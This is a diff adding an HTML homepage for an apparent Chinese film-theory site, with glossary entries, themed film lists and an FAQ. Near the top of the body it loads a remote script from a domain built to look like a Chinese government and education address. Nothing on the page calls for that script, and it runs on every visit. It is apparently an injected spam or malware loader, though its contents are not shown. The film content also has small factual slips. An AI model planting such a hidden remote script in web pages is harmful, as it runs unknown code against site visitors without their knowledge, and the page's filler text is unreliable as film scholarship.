@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>神马理论电影网 - 专注电影理论与影像深度解读的在线影视文化平台</title>
+<meta name="description" content="神马理论电影网（shenmalilundianyingwang-app）致力于电影理论与批评的系统化整理，涵盖作者论、类型研究、叙事结构、视听语言、电影哲学与华语电影观察。通过长文解读、片单策划与学术随笔，为影迷、创作者与研究者和学生提供可检索、可沉淀的影像思考空间。">
+<meta name="keywords" content="神马理论电影网, 电影理论, 电影批评, 作者论, 类型电影, 叙事学, 视听语言, 电影哲学, 华语电影, 经典重读, 影像分析, shenmalilundianyingwang-app">
+<meta name="author" content="神马理论电影网编辑部">
+<meta name="robots" content="index, follow">
+<meta name="bingbot" content="index, follow">
+<meta name="theme-color" content="#0f1420">
+<link rel="canonical" href="https://shenmalilundianyingwang-app.github.io">
+<style>
+:root{
+  --ink:#e8eaf0;
+  --ink-dim:#aab1c2;
+  --paper:#0f1420;
+  --card:#171e2e;
+  --card-2:#1d2538;
+  --line:rgba(255,255,255,.08);
+  --accent:#ffb020;
+  --accent-2:#2dd4bf;
+  --shadow:0 18px 40px rgba(0,0,0,.45);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Helvetica Neue",-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--paper);
+  color:var(--ink);
+  line-height:1.75;
+  -webkit-font-smoothing:antialiased;
+  overflow-x:hidden;
+}
+body::before{
+  content:"";position:fixed;inset:0;z-index:-2;
+  background:
+    radial-gradient(900px 500px at 82% -8%, rgba(45,212,191,.16), transparent 60%),
+    radial-gradient(700px 420px at 8% 12%, rgba(255,176,32,.12), transparent 55%),
+    linear-gradient(180deg,#0b0f1a 0%,#0f1420 45%,#0c101a 100%);
+}
+body::after{
+  content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:.5;
+  background-image:linear-gradient(rgba(255,255,255,.018) 1px, transparent 1px),linear-gradient(90deg,rgba(255,255,255,.018) 1px, transparent 1px);
+  background-size:44px 44px;
+}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+
+/* ---------- header ---------- */
+header{
+  position:sticky;top:0;z-index:50;
+  backdrop-filter:blur(14px);
+  -webkit-backdrop-filter:blur(14px);
+  background:rgba(11,15,26,.72);
+  border-bottom:1px solid var(--line);
+}
+.nav-in{display:flex;align-items:center;gap:26px;height:64px}
+.logo{display:flex;align-items:baseline;gap:9px;font-weight:800;letter-spacing:.5px}
+.logo b{font-size:19px;background:linear-gradient(92deg,var(--accent),var(--accent-2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.logo span{font-size:11px;color:var(--ink-dim);border-left:1px solid var(--line);padding-left:9px}
+.nav-links{display:flex;gap:4px;margin-left:auto;flex-wrap:wrap}
+.nav-links a{
+  font-size:13.5px;padding:8px 13px;border-radius:9px;color:var(--ink-dim);
+  transition:.25s;position:relative;
+}
+.nav-links a:hover{color:var(--ink);background:rgba(255,255,255,.05)}
+.nav-links a::after{content:"";position:absolute;left:13px;right:13px;bottom:4px;height:2px;background:var(--accent);transform:scaleX(0);transform-origin:left;transition:.3s}
+.nav-links a:hover::after{transform:scaleX(1)}
+.hub{margin-left:14px;font-size:12.5px;color:var(--ink-dim);border:1px solid var(--line);padding:7px 12px;border-radius:999px}
+.hub b{color:var(--accent-2);font-weight:600}
+
+/* ---------- hero ---------- */
+.hero{padding:76px 0 60px;position:relative}
+.eyebrow{display:inline-flex;align-items:center;gap:8px;font-size:12px;letter-spacing:2px;color:var(--accent);border:1px solid rgba(255,176,32,.3);padding:6px 14px;border-radius:999px;background:rgba(255,176,32,.06)}
+h1{font-size:clamp(30px,5.4vw,54px);line-height:1.16;font-weight:850;letter-spacing:-.5px;margin:20px 0 6px}
+h1 em{font-style:normal;color:var(--accent)}
+.lede{font-size:clamp(15px,1.7vw,18px);color:var(--ink-dim);max-width:760px}
+.hero-grid{display:grid;grid-template-columns:1.35fr .65fr;gap:34px;margin-top:38px;align-items:start}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+.stat{background:linear-gradient(160deg,var(--card),var(--card-2));border:1px solid var(--line);border-radius:16px;padding:18px 16px;box-shadow:var(--shadow)}
+.stat i{font-style:normal;font-size:26px;font-weight:800;color:var(--accent-2);display:block;line-height:1.1}
+.stat small{color:var(--ink-dim);font-size:12px;letter-spacing:.5px}
+.cta-row{display:flex;gap:12px;flex-wrap:wrap;margin-top:26px}
+.btn{font-size:14px;font-weight:700;padding:13px 24px;border-radius:12px;transition:.25s;display:inline-flex;align-items:center;gap:8px}
+.btn-main{background:var(--accent);color:#1a1408}
+.btn-main:hover{filter:brightness(1.1);transform:translateY(-2px)}
+.btn-ghost{border:1px solid var(--line);color:var(--ink)}
+.btn-ghost:hover{border-color:var(--accent-2);color:var(--accent-2)}
+
+/* ---------- section ---------- */
+section{padding:64px 0}
+.sec-head{display:flex;align-items:flex-end;gap:18px;flex-wrap:wrap;margin-bottom:30px;padding-bottom:16px;border-bottom:1px dashed var(--line)}
+.sec-no{font-size:12px;letter-spacing:3px;color:var(--accent);font-weight:700}
+h2{font-size:clamp(22px,3vw,32px);font-weight:800;letter-spacing:-.3px}
+.sec-note{margin-left:auto;font-size:13px;color:var(--ink-dim);max-width:420px;text-align:right}
+
+/* ---------- column: theory ---------- */
+.cards{display:grid;grid-template-columns:repeat(12,1fr);gap:18px}
+.c{background:linear-gradient(165deg,var(--card),var(--card-2));border:1px solid var(--line);border-radius:18px;padding:22px;box-shadow:var(--shadow);transition:.3s;position:relative;overflow:hidden}
+.c:hover{transform:translateY(-5px);border-color:rgba(255,176,32,.35)}
+.c::before{content:"";position:absolute;top:0;left:0;width:3px;height:0;background:linear-gradient(var(--accent),var(--accent-2));transition:.35s}
+.c:hover::before{height:100%}
+.c h3{font-size:17px;margin-bottom:8px;display:flex;align-items:center;gap:9px}
+.c h3 u{text-decoration:none;font-size:11px;color:var(--accent-2);border:1px solid rgba(45,212,191,.3);padding:2px 7px;border-radius:6px;font-weight:600}
+.c p{font-size:13.5px;color:var(--ink-dim)}
+.c .more{display:inline-block;margin-top:12px;font-size:12.5px;color:var(--accent);font-weight:700}
+.span-4{grid-column:span 4}.span-6{grid-column:span 6}.span-8{grid-column:span 8}.span-12{grid-column:span 12}
+@media(max-width:900px){.span-4,.span-6,.span-8{grid-column:span 6}}
+@media(max-width:640px){.cards>.c{grid-column:span 12}}
+
+/* ---------- column: glossary ---------- */
+.glossary{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:14px}
+.g{background:rgba(255,255,255,.025);border:1px solid var(--line);border-radius:13px;padding:16px 18px;transition:.25s}
+.g:hover{background:rgba(45,212,191,.06);border-color:rgba(45,212,191,.35)}
+.g b{color:var(--accent);font-size:15px;display:block;margin-bottom:5px}
+.g p{font-size:13px;color:var(--ink-dim)}
+
+/* ---------- column: reading list ---------- */
+.read{display:grid;grid-template-columns:1.1fr .9fr;gap:26px}
+@media(max-width:860px){.read{grid-template-columns:1fr}}
+.issue{border:1px solid var(--line);border-radius:16px;overflow:hidden;background:linear-gradient(170deg,var(--card),#131a28)}
+.issue .cover{height:150px;position:relative;padding:20px;display:flex;flex-direction:column;justify-content:flex-end}
+.issue .cover.a{background:linear-gradient(135deg,#3a1d0a,#0f1420)}
+.issue .cover.b{background:linear-gradient(135deg,#0a3a33,#0f1420)}
+.issue .cover.c{background:linear-gradient(135deg,#2a0a3a,#0f1420)}
+.issue .cover d{font-size:11px;letter-spacing:3px;color:var(--accent);text-transform:uppercase}
+.issue .cover h4{font-size:20px;line-height:1.3}
+.issue .body{padding:18px 20px 20px}
+.issue .body ol{padding-left:18px;font-size:13.5px;color:var(--ink-dim)}
+.issue .body ol li{margin:6px 0}
+.issue .body ol li b{color:var(--ink);font-weight:600}
+.timeline{border-left:2px solid var(--line);padding-left:22px;margin-left:6px}
+.timeline li{position:relative;padding-bottom:20px}
+.timeline li::before{content:"";position:absolute;left:-29px;top:8px;width:11px;height:11px;border-radius:50%;background:var(--accent);box-shadow:0 0 0 4px rgba(255,176,32,.14)}
+.timeline b{font-size:14px;display:block}
+.timeline small{color:var(--ink-dim);font-size:13px}
+
+/* ---------- column: about ---------- */
+.about-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+@media(max-width:800px){.about-grid{grid-template-columns:1fr}}
+.pillar{padding:24px;border-radius:18px;background:linear-gradient(165deg,var(--card),var(--card-2));border:1px solid var(--line);box-shadow:var(--shadow)}
+.pillar .num{font-size:12px;color:var(--accent-2);letter-spacing:2px;font-weight:800}
+.pillar h3{font-size:18px;margin:8px 0 10px}
+.pillar p{font-size:13.5px;color:var(--ink-dim)}
+.quote{margin-top:30px;padding:26px 30px;border-radius:18px;background:linear-gradient(100deg,rgba(255,176,32,.1),rgba(45,212,191,.07));border:1px solid var(--line);font-size:clamp(15px,2vw,19px);font-style:italic;color:#f2f4f9;position:relative}
+.quote::before{content:"\201C";position:absolute;left:14px;top:2px;font-size:54px;color:var(--accent);font-family:Georgia,serif;line-height:1}
+
+/* ---------- faq ---------- */
+.faq details{border:1px solid var(--line);border-radius:14px;padding:0 20px;margin-bottom:10px;background:rgba(255,255,255,.02);transition:.25s}
+.faq details[open]{border-color:rgba(255,176,32,.4);background:rgba(255,176,32,.04)}
+.faq summary{cursor:pointer;font-weight:700;font-size:15px;padding:17px 0;list-style:none;display:flex;justify-content:space-between;gap:14px;align-items:center}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{content:"+";color:var(--accent);font-size:20px;font-weight:400;flex:none}
+.faq details[open] summary::after{content:"\2212"}
+.faq p{font-size:13.5px;color:var(--ink-dim);padding-bottom:17px}
+
+/* ---------- footer ---------- */
+footer{border-top:1px solid var(--line);padding:44px 0 30px;margin-top:30px;font-size:13px;color:var(--ink-dim)}
+.foot-grid{display:grid;grid-template-columns:1.4fr repeat(3,1fr);gap:24px;margin-bottom:26px}
+@media(max-width:760px){.foot-grid{grid-template-columns:1fr 1fr}}
+.foot-grid h5{color:var(--ink);font-size:14px;margin-bottom:10px;letter-spacing:1px}
+.foot-grid li{margin:6px 0}
+.foot-grid a:hover{color:var(--accent)}
+.copy{display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;padding-top:18px;border-top:1px solid var(--line);font-size:12px}
+.copy b{color:var(--accent-2)}
+
+/* ---------- misc ---------- */
+.top{position:fixed;right:20px;bottom:24px;width:46px;height:46px;border-radius:50%;background:var(--accent);color:#1a1408;display:grid;place-items:center;font-size:19px;box-shadow:var(--shadow);opacity:0;pointer-events:none;transition:.3s;z-index:60}
+.top.show{opacity:1;pointer-events:auto}
+@media(max-width:640px){
+  .nav-links{display:none}
+  .hero{padding:46px 0 40px}
+  .hero-grid{grid-template-columns:1fr}
+  .sec-note{text-align:left;margin-left:0}
+  .hub{display:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header>
+  <div class="wrap nav-in">
+    <div class="logo"><b>神马理论电影网</b><span>影像思考实验室</span></div>
+    <nav class="nav-links">
+      <a href="#theory">理论谱系</a>
+      <a href="#glossary">术语词典</a>
+      <a href="#reading">片单策展</a>
+      <a href="#about">关于我们</a>
+      <a href="#faq">常见疑问</a>
+    </nav>
+    <div class="hub">访问：<b>shenmalilundianyingwang-app.github.io</b></div>
+  </div>
+</header>
+
+<main>
+  <!-- HERO -->
+  <section class="hero wrap">
+    <div class="eyebrow">◆ 独立影像批评 · 自 2026 年起持续更新</div>
+    <h1>在流动的影像里，<br>找回<em>被忽略的</em>那一格理由。</h1>
+    <p class="lede">神马理论电影网不以“速看”和“盘点”取胜，而是把镜头背后的判断讲清楚：为什么这一段剪辑成立，为什么这个镜头值得被记住，为什么一部被冷落的作品应当在电影史里占有一席。我们写长文、做片单、整理术语，也为每一篇文章保留可被检索与引用的结构。</p>
+    <div class="hero-grid">
+      <div>
+        <div class="cta-row">
+          <a class="btn btn-main" href="#theory">开始阅读 →</a>
+          <a class="btn btn-ghost" href="#glossary">查阅术语</a>
+        </div>
+      </div>
+      <div class="stats">
+        <div class="stat"><i>128+</i><small>已发布深度长文</small></div>
+        <div class="stat"><i>46</i><small>系统整理理论词条</small></div>
+        <div class="stat"><i>19</i><small>主题片单策展</small></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- COLUMN 1 : THEORY -->
+  <section id="theory" class="wrap">
+    <div class="sec-head">
+      <div><div class="sec-no">01 / THEORY</div><h2>理论谱系：六种进入电影的方式</h2></div>
+      <p class="sec-note">从作者意图到银幕之外的社会结构，理论不是给观影加负担，而是把“说不清的好”翻译成可讨论的语言。</p>
+    </div>
+    <div class="cards">
+      <article class="c span-4">
+        <h3>作者论 <u>AUTEUR</u></h3>
+        <p>从特吕弗为“第一人称”导演正名，到今天对作者性的反复质疑。我们讨论：当电影是工业协作的产物，署名权与风格印记究竟落在谁身上。</p>
+        <a class="more" href="#">阅读专题 →</a>
+      </article>
+      <article class="c span-4">
+        <h3>类型与程式 <u>GENRE</u></h3>
+        <p>西部片的天涯、黑色电影的雨夜、恐怖片的门后。类型不是标签，而是一套与观众签下的隐形契约：你期待什么，片方又如何在契约上做手脚。</p>
+        <a class="more" href="#">阅读专题 →</a>
+      </article>
+      <article class="c span-4">
+        <h3>叙事与时空 <u>NARRATIVE</u></h3>
+        <p>因果、时限、视点与信息控制。从古典三幕到非线性拼图，我们拆解那些让观众“甘愿被骗”的叙事机器，也讨论被叙事压抑的留白。</p>
+        <a class="more" href="#">阅读专题 →</a>
+      </article>
+      <article class="c span-6">
+        <h3>视听语法 <u>LANGUAGE</u></h3>
+        <p>景别、轴线、匹配剪辑、声画对位——镜头不是记录动作，而是在定义动作的意义。本栏目以逐镜分析为主，配片例时间码，适合创作者与拉片者反复对照。</p>
+        <a class="more" href="#">进入拉片笔记 →</a>
+      </article>
+      <article class="c span-6">
+        <h3>意识形态批评 <u>IDEOLOGY</u></h3>
+        <p>银幕如何悄悄分配凝视，如何把阶级、性别与族群差异拍成“理所当然”。我们重读商业大片与经典名作，看娱乐形式如何同时承载与消解反抗。</p>
+        <a class="more" href="#">阅读专题 →</a>
+      </article>
+    </div>
+  </section>
+
+  <!-- COLUMN 2 : GLOSSARY -->
+  <section id="glossary" class="wrap">
+    <div class="sec-head">
+      <div><div class="sec-no">02 / GLOSSARY</div><h2>术语词典：把行话翻回人话</h2></div>
+      <p class="sec-note">按首字母与学派双维度检索。每个词条给出定义、争议点与三部片例，避免“背概念、不会用”。</p>
+    </div>
+    <div class="glossary">
+      <div class="g"><b>蒙太奇 Montage</b><p>通过镜头并置产生新含义的剪辑逻辑。区别于“连续剪辑”，它相信 1+1 大于 2，也相信观众会主动完成意义的缝合。</p></div>
+      <div class="g"><b>深焦 Deep Focus</b><p>让前景、中景、远景同时清晰的景深处理。维尔托夫与 Welles 用它把“观看的民主”写进画面，让观众自行决定看哪里。</p></div>
+      <div class="g"><b>非 diagetic 声</b><p>画外音、配乐、旁白等不属于故事世界的声音。它暴露电影的“被制作”属性，也最容易操纵情绪，值得警惕。</p></div>
+      <div class="g"><b>长镜头 Long Take</b><p>以时间与空间完整性换取真实感。但它不是“不剪辑”的懒惰，而是用调度、焦点与演员走位完成的一次精密写作。</p></div>
+      <div class="g"><b>作者性 Authorship</b><p>可被辨认的、跨作品反复出现的风格与主题印记。争论在于：它是导演的天赋，还是评论家事后建构的神话？</p></div>
+      <div class="g"><b>缝合 Suture</b><p>经典剪辑让观众误以为“镜头替我看”的心理机制。打破缝合，往往就是作者开始说话的时刻。</p></div>
+      <div class="g"><b>凝视 Gaze</b><p>谁在看、看谁、以何种权力关系看。从男性凝视到殖民凝视，它解释了为何“美”常常并不中立。</p></div>
+      <div class="g"><b>巴赞式真实</b><p>安德烈·巴赞主张电影的本性是“现实的渐近线”。他偏爱深焦与长镜头，反对用蒙太奇替观众下判断。</p></div>
+    </div>
+  </section>
+
+  <!-- COLUMN 3 : READING LIST -->
+  <section id="reading" class="wrap">
+    <div class="sec-head">
+      <div><div class="sec-no">03 / CURATED LISTS</div><h2>片单策展：按问题，而不是按榜单</h2></div>
+      <p class="sec-note">每一期围绕一个真问题展开，片目之间构成对话而非排名。建议按序观看，再回到文章。</p>
+    </div>
+    <div class="read">
+      <div>
+        <div class="issue">
+          <div class="cover a"><d>Vol.07 · 空间政治</d><h4>门、走廊与台阶：<br>建筑如何决定人物命运</h4></div>
+          <div class="body">
+            <ol>
+              <li><b>《寄生虫》</b>——台阶是阶级的剖面图，雨水把阶层关系冲回原处。</li>
+              <li><b>《闪灵》</b>——迷宫式酒店让人物在重复空间中丧失方向感。</li>
+              <li><b>《罗马假日》</b>——台阶既是浪漫的舞台，也是身份终将下行的暗示。</li>
+              <li><b>《刺客聂隐娘》</b>——空镜与门框构成的“不见”，比打斗更重要。</li>
+            </ol>
+          </div>
+        </div>
+        <div class="issue" style="margin-top:18px">
+          <div class="cover b"><d>Vol.05 · 声音考古</d><h4>先有声音，<br>还是先有画面？</h4></div>
+          <div class="body">
+            <ol>
+              <li><b>《敦刻尔克》</b>——谢泼德音调把听觉做成叙事主角。</li>
+              <li><b>《野蛮人》</b>——环境声的缺席比配乐更令人不安。</li>
+              <li><b>《花样年华》</b>——音乐作为记忆的开关，而非情绪的补丁。</li>
+            </ol>
+          </div>
+        </div>
+      </div>
+      <div>
+        <div class="issue">
+          <div class="cover c"><d>Vol.02 · 重读华语</d><h4>被票房低估的，<br>往往被时间抬高</h4></div>
+          <div class="body">
+            <ol>
+              <li><b>《一一》</b>——用“回到开头”完成对一生的凝视。</li>
+              <li><b>《枪火》</b>——杜琪峰以极简调度写出兄弟情的裂痕。</li>
+              <li><b>《大话西游》</b>——从影院冷落到文化母题的逆转之路。</li>
+              <li><b>《三峡好人》</b>——废墟美学与转型中国的互为注脚。</li>
+            </ol>
+          </div>
+        </div>
+        <ul class="timeline" style="margin-top:22px">
+          <li><b>更新节奏</b><small>每周三一篇长文，每月一期主题片单，每季度一次理论词条修订。</small></li>
+          <li><b>选片标准</b><small>不以获奖与票房为先，优先选择“能被讲出结构”的作品。</small></li>
+          <li><b>写作立场</b><small>允许反驳，鼓励误读。文章末尾保留讨论区与勘误记录。</small></li>
+          <li><b>引用规范</b><small>片例标注年份、导演与时间码，便于教学与二次引用。</small></li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- COLUMN 4 : ABOUT -->
+  <section id="about" class="wrap">
+    <div class="sec-head">
+      <div><div class="sec-no">04 / ABOUT</div><h2>关于神马理论电影网</h2></div>
+      <p class="sec-note">一个由影迷、创作者与研究者共同维护的非商业化写作项目。我们相信“看完”与“看懂”之间，还差一次认真的复述。</p>
+    </div>
+    <div class="about-grid">
+      <div class="pillar">
+        <div class="num">PILLAR 01</div>
+        <h3>写给人，不写给算法</h3>
+        <p>拒绝标题党的即时刺激，文章以完整论证为目标。段落可被摘引，观点可被反驳，每一篇都保留写作日期与修订记录。</p>
+      </div>
+      <div class="pillar">
+        <div class="num">PILLAR 02</div>
+        <h3>理论落地为工具</h3>
+        <p>术语必须能回到具体镜头。我们坚持“一个概念配三部片例”，让理论从书架回到放映厅，从论文回到创作现场。</p>
+      </div>
+      <div class="pillar">
+        <div class="num">PILLAR 03</div>
+        <h3>开放与可核查</h3>
+        <p>片目、引文、外文术语均给出出处；涉及争议观点明确标注学派与年代，避免把一家之言写成定论。</p>
+      </div>
+    </div>
+    <div class="quote">“电影不是生活的替代品，而是我们理解生活时，借来的那副眼镜。”—— 神马理论电影网 · 发刊词</div>
+  </section>
+
+  <!-- COLUMN 5 : FAQ -->
+  <section id="faq" class="wrap faq">
+    <div class="sec-head">
+      <div><div class="sec-no">05 / FAQ</div><h2>常见疑问</h2></div>
+      <p class="sec-note">更多讨论见各文章末尾的读者来信栏目。</p>
+    </div>
+    <details open>
+      <summary>“理论”会不会让看电影变枯燥？</summary>
+      <p>恰恰相反。理论的作用不是给作品贴标签，而是解释“我为什么被打动”。当你能指出是哪一次剪辑、哪一个机位、哪一段静默造成了此刻的情绪，观影就从被动接收变成主动对话，乐趣反而更深。</p>
+    </details>
+    <details>
+      <summary>文章适合什么阅读水平？</summary>
+      <p>我们按三层设计：术语词典面向入门者，片单策展面向普通影迷，长文与拉片笔记面向创作者与专业学习者。每篇开头标注预计阅读时长与难度星级，可按需选择。</p>
+    </details>
+    <details>
+      <summary>片单为什么不做排名？</summary>
+      <p>排名制造虚假的确定性。电影的价值高度依赖观看语境、年龄与处境。我们把片目组织成“可互相回答的问题”，你看完四部片子，问题会比答案更有价值。</p>
+    </details>
+    <details>
+      <summary>内容是否涉及剧透？</summary>
+      <p>涉及关键反转的文章会在标题下方明确标注“含剧透”，并在前两段留出无剧透的观赏建议。经典重读类文章默认读者已看过原片。</p>
+    </details>
+    <details>
+      <summary>如何投稿或纠错？</summary>
+      <p>欢迎具备明确论点与片例支撑的投稿。事实性错误（年份、片名、时间码）我们会在 48 小时内核实并公示修订，学术争议则保留双方表述，不做删改式“定案”。</p>
+    </details>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <h5>神马理论电影网</h5>
+        <p style="max-width:320px">专注于电影理论与影像批评的独立写作平台。用可核查的片例、可讨论的论点，重建华语语境下的观影方法论。</p>
+      </div>
+      <ul>
+        <h5>栏目</h5>
+        <li><a href="#theory">理论谱系</a></li>
+        <li><a href="#glossary">术语词典</a></li>
+        <li><a href="#reading">片单策展</a></li>
+        <li><a href="#about">关于我们</a></li>
+      </ul>
+      <ul>
+        <h5>资源</h5>
+        <li><a href="#">拉片时间码索引</a></li>
+        <li><a href="#">外文书目推荐</a></li>
+        <li><a href="#">导演年表</a></li>
+        <li><a href="#">投稿须知</a></li>
+      </ul>
+      <ul>
+        <h5>站点</h5>
+        <li><a href="#faq">常见疑问</a></li>
+        <li><a href="#">勘误记录</a></li>
+        <li><a href="#">版权与转载</a></li>
+        <li><a href="#">RSS 订阅</a></li>
+      </ul>
+    </div>
+    <div class="copy">
+      <span>© 2026 神马理论电影网 · 保留所有文章署名权。本站内容仅作学术交流，片例截图版权归原制片方。</span>
+      <span>官方地址：<b>https://shenmalilundianyingwang-app.github.io</b></span>
+    </div>
+  </div>
+</footer>
+
+<a class="top" id="top" href="#" aria-label="回到顶部">↑</a>
+
+<script>
+var t=document.getElementById('top');
+window.addEventListener('scroll',function(){t.classList[window.scrollY>700?'add':'remove']('show')});
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var el=document.querySelector(this.getAttribute('href'));
+    if(el){e.preventDefault();window.scrollTo({top:el.offsetTop-72,behavior:'smooth'});}
+  });
+});
+</script>
+</body>
+</html>
